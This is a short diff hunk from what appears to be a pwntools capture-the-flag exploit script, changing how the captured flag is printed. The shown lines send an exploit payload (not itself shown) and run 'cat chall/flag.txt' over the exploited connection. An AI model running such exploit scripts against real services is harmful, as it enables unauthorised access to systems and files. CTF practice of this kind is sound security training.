@@ -35,6 +35,6 @@ io.sendlineafter(b"already.", payload)
 
 io.recvuntil(b"?!\n")
 io.sendline(b"cat chall/flag.txt")
-print(io.recvline().strip().decode())
+success(f"Flag: {io.recvline().strip().decode()}")
 io.close()
 # io.interactive()
